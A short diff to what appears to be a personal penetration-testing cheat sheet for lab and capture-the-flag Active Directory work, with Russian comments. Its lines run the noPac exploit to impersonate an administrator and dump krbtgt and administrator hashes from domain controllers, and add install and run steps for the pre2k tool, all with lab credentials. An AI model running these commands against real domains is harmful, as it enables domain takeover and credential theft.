@@ -1553,3 +1553,12 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 	python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump -just-dc-user cgdomain/krbtgt		--- дампим krbtgt
 
 	python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator   --- дампим админ
+
+# Pre2k
+
+	git clone https://github.com/garrettfoster13/pre2k.git
+	cd pre2k
+	ls
+	pipx install .
+	pre2k auth -u raj -p Password@1 -dc-ip 192.168.1.48 -d ignite.local
+	
